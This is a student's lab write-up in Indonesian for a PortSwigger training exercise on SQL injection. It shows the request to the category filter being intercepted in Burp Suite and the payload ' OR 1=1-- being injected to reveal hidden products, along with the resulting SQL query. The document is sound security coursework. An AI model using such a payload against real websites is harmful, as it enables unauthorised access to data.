# Soal Mandiri 1 
# SQL Injection Vulnerability in WHERE Clause (Retrieve Hidden Data)

Lab ini memiliki kerentanan SQL injection pada parameter kategori produk.  
Tujuan eksploitasi adalah menampilkan seluruh produk yang ada di database, bukan hanya produk dari kategori tertentu.

## 2. Link Resource
- [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)



## 3. Jawaban Mahasiswa

### Step-by-step
1. **Awal lab**  
   Halaman utama hanya menampilkan produk sesuai kategori yang dipilih (contoh: *Pets*).  
![WhatsApp Image 2025-09-10 at 04 05 14_806d3f6b](https://github.com/user-attachments/assets/fe1d311f-de5e-4f6a-80ef-91eff45bb4b8)


2. **Intercept request**  
   Saat memilih kategori *Pets*, request berikut tertangkap di Burp Suite:  
GET /filter?category=Pets HTTP/1.1
Host: <lab-id>.web-security-academy.net

![Request asli di Burp](../images/request_asli_burp.jpg)


![WhatsApp Image 2025-09-10 at 04 07 03_b5896491](https://github.com/user-attachments/assets/8b168251-a029-4fcc-b034-917619a3efd8)


![WhatsApp Image 2025-09-10 at 04 08 04_b71206f6](https://github.com/user-attachments/assets/70df65d2-33a6-454c-955a-88fd3691c382)

3. **Modifikasi request di Repeater**  
Payload SQLi sederhana ditambahkan:  

GET /filter?category=Pets' OR 1=1-- HTTP/1.1
Host: <lab-id>.web-security-academy.net

![WhatsApp Image 2025-09-10 at 04 09 30_b05b4e75](https://github.com/user-attachments/assets/f93bbdcc-b288-4d6a-9546-0419f155906c)


4. **Response server**  
Response HTML memperlihatkan banyak produk dari berbagai kategori.  

5. **Validasi di browser**  
Browser menampilkan seluruh produk dari semua kategori, bukan hanya *Pets*.  


![WhatsApp Image 2025-09-10 at 04 11 46_878f6f8a](https://github.com/user-attachments/assets/898e90b9-2105-45ff-a286-2cf2f9da656f)


6. **Status Solved**  
Banner hijau *“Congratulations, you solved the lab!”* muncul → artinya exploit berhasil.  

![WhatsApp Image 2025-09-10 at 04 12 26_637c6b19](https://github.com/user-attachments/assets/f78753e7-a1ba-4c53-b2d7-11420a3b83e2)


SELECT * FROM products WHERE category = 'Pets' AND released = 1;
```
SELECT * FROM products WHERE category = 'Pets' OR 1=1--' AND released = 1;

## Selesai
